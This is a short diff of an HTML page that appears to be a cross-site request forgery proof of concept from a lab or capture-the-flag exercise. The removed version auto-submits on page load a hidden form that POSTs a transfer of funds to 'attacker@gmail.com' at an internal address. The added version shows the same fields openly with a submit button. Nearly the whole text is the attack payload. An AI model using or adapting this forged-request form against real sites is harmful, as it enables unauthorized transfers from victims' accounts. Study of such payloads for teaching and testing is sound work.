@@ -22,10 +22,11 @@
     <h1 id="flag" style="text-align:center;"></h1>
 </body> -->
 
-<body onload="document.forms[0].submit()">
+<body>
 
     <form action="http://192.168.2.98:49698/transfer" method="POST">
-        <input type="hidden" name="user_to" value="attacker@gmail.com"/>
-        <input type="hidden" name="amount" value="1"/>
+        <input type="text" name="user_to" value="attacker@gmail.com"/>
+        <input type="text" name="amount" value="1"/>
+        <input type="submit" value="transfer"/>
     </form>
 </body>
